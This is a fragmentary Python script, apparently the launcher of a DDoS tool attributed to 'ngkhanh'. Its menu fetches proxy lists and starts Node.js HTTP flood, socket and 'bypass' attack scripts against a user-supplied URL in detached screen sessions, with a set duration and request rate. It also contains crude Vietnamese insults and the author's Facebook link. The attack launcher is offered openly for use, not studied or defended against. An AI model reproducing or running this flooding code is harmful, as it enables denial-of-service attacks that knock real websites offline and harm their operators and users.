...
""")
		...
		while True:
			sys.stdout.write(Color.LB+"📌 "+Color.LR+"["+Color.LG+"ngkhanh#8886""]"+Color.LB+"\n➠ "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					...
					for i in range(150):
						...
						time.sleep(0.01)
					with open("ngkhanhh/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node vdh/Method/socket {url} ngkhanhh/http.txt {floodtime} {reqs}'], shell=True)
				except:
				...
				try:
					...
					with open("ngkhanhh/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node vdh/Method/flood GET {url} ngkhanhh/http.txt {floodtime} 64 1'], shell=True)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
				...
				try:
					...
					with open("ngkhanhh/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node ngkhanhh/Method/bypass {url} {floodtime}'], shell=True)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
...
def main():
	...
	try:
		script = True
		with open('ngkhanhh') as important:pass
	except IsADirectoryError:pass
	except FileNotFoundError:
		print(f"{Color.LR}[LỖI]:{Color.RESET} File: 'ngkhanhh' NotFound")
		print("\nLàm Ơn -> git clone: Cái con cặc\n")
...
if __name__ == '__main__':
	...
	contact = f"""Facebook: https://www.facebook.com/trngkhanhhh\nZalo: STFU"""
